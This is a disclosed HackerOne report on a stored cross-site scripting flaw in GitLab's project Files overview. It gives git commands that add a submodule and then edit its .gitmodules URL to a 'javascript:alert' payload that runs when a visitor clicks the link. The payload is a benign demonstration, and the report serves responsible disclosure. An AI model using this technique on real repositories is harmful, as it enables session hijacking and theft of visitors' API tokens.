# Stored XSS on Files overview by abusing git submodule URL

## Report Details
- **Report ID**: 218872
- **URL**: https://hackerone.com/reports/218872
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-04-05T20:33:16.970Z
- **Disclosed**: 2017-05-09T16:00:07.317Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Vulnerability description
There's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.

# Proof of concept
To reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:

```
git clone git@gitlab.com:user/project
git clone git@gitlab.com:user/project.wiki
```

Now `cd project.wiki`  and initialize the repository:

```
touch some-file
git add some-file
git commit -am "Added file to initialize wiki repository"
git push
```

Now repeat the same in the `project` directory add the `project.wiki` as a relative git submodule to `project`:

```
touch some-file
git add some-file
git commit -am "Added file to initialize project repository"
git push
git submodule add ../project.wiki wiki
git add wiki
git commit -am "Added relative wiki module"
git push
```

This will create a `.gitmodules` file with the following contents:

```
[submodule "wiki"]
  path = wiki
  url = ../project.wiki
```

In this file, the URL can be updated to a `javascript:` URL. It won't error because the contents of the submodule are already fetched by the `git submodule add` command. Lets change `url = ../project.wiki` to `url = javascript:alert('XSS');` (see F173589). Now commit the results and push the changes:

```
git add .
git commit -am "Updated relative URL"
git push
```

Now go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the `wiki` directory, and see the JavaScript getting executed:

{F173602}

# Impact
An attacker could offload the current user's API token and impersonate the user through the API.

## Attachments
- gitmodules
- Screen_Shot_2017-04-05_at_13.30.31.png
